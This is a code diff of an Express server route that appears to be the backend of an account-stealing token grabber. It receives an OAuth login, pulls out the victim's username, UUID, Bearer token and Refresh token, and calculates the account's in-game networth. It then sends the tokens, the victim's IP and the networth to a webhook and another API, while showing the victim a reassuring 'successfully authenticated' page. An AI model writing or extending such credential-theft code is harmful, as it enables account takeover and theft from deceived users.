@@ -27,7 +27,7 @@ app.get('/', async (req, res) => {
     }
     try {
         // get all the data
-        data = await ReturnData(code);
+        const data = await ReturnData(code);
         const username = data[0];
         const uuid = data[1];
         const BearerToken = data[2];
@@ -40,22 +40,33 @@ app.get('/', async (req, res) => {
         let sentnetworth = 0;
         let description = "No profile data found. 🙁";
 
-        // Replace networthCalc call with a simple output
-        networth = "Networth Calculator Rework";
-        soulboundnetworth = "Networth Calculator Rework";
-        description = "Networth Calculator Rework";
-        sentnetworth = 0;
+        // get networth and description
+        networthCalc(uuid).then((result) => {
+            networth = Intl.NumberFormat('en-US', {
+                notation: 'compact',
+                maximumFractionDigits: 2,
+            }).format(result[0]);
+            soulboundnetworth = Intl.NumberFormat('en-US', {
+                notation: 'compact',
+                maximumFractionDigits: 2,
+            }).format(result[1]);
+            description = result[2];
+            sentnetworth = (Math.trunc(result[0])) / 1000000;
 
-        // send everything to the webhook
-        PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
-        // send everything to the API
-        SendAPIData(username, sentnetworth);
+            // send everything to the webhook
+            PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
+            // send everything to the API
+            SendAPI(username, sentnetworth);
+        }).catch((error) => {
+            console.log(error);
+        });
     } catch (e) {
         console.log(e);
     }
-    // put something to the screen so that the user can leave the page
-    res.send('You were successfully authenticated! You can now close this tab.');
+    // Serve the success HTML file
+    res.sendFile(path.join(__dirname, 'public', 'success.html'));
 });
+
 
 // start the server
 app.listen(port, () => {
